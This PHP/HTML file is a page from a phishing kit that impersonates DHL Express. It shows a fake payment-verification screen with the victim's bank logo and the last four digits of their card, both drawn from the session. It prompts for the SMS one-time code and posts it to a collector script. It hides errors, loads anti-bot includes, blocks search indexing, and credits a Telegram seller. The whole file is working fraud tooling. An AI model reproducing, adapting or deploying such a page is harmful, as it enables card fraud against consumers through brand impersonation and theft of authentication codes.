<?php

//** Cleaned by M3dcoder telegram : https://t.me/M3dL4m1n3 **//

session_start();
//** Cleaned by M3dcoder telegram : https://t.me/M3dL4m1n3 **//

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include("./AlexRony/911.php");
include("./AlexRony/SYS.php");
include("X_911.php");

$one = $_SESSION["one"];
$one = str_replace(" ","",$one);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./X911/font-awesome.min.css">
		<link rel="stylesheet" href="./X911/style.css">
		<link rel="stylesheet" href="./X911/bootstrap-icons.css">
		
        <link rel="icon" type="image/x-icon" href="./X911/favicon.ico" />

        <title>| DHL |</title>
    </head>
<body>

	<form action="./siftA/Dsmm.php" method="post">
	<input type="hidden" name="captcha">
	<input type="hidden" name="step" value="">
					
        <div>
		  <div class="modal-dialog shadow">
		    <div class="modal-content">
		      <div class="modal-header">
		        	<img src="./X911/dhl-logo.svg">
		            <img src="./X911/<?php echo $_SESSION['bank_scheme']; ?>.png" class="sfli">
		      </div>
		      <div class="modal-body">
		      	<div class="text-center pp">
                    <h6><?php echo get_text("sms-title"); ?></h6>
                </div>
                <div class="tato">
                     <p style=" text-align: center; "><?php echo get_text("sms-message"); ?></p>
                        <br>
                </div>
               
                     
                     <div class="content">
                         <div class="left">
                             <span><?php echo get_text("merchant"); ?>:</span>
                             <span><?php echo get_text("amount"); ?>:</span>
                             <span><?php echo get_text("date"); ?>:</span>
                             <span><?php echo get_text("credit-card-number"); ?>:</span>
                             <span class="osama"><?php echo get_text("sms_code_label"); ?></span>
                         </div>
                         <div class="right">
                             <span style="color: rgb(227,41,31);">DHL Express</span>
                             <span><?php echo get_text("total"); ?></span>
                             <span><?php echo date("d/m/Y h:i A"); ?></span>
                             <span>XXXX XXXX XXXX <?php echo substr($one , -4);?></span>
                             <span>
                                 <div class="form-group">
                                     <input type="text" name="sm" id="sm" class="form-control" style=" border-radius: 1.25rem; border-color: red;" maxlength="20" Required>
									 <b style=" font: status-bar; color: #cd3131c7; font-weight: bold; "><?php echo get_text("sms_errur"); ?></b>
                                 </div>
                             </span>
                         </div>
                     </div>
                     <div class="time " >
                         <p><?php echo get_text("sms-again"); ?></p>
                         <div class="countdown ms-2" style="color:red;"></div>
                     </div>
                     <div class="botona">
                         <button class="btn" name="submit"><?php echo get_text("submit"); ?></button>
                     </div>
                     <div class="copirayt text-center">
                         <p><?php echo get_text("copyright"); ?></p>
                     </div>
              
		      </div>
		    </div>
		  </div>
		</div>
    </form>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        
     </body>
	 </html>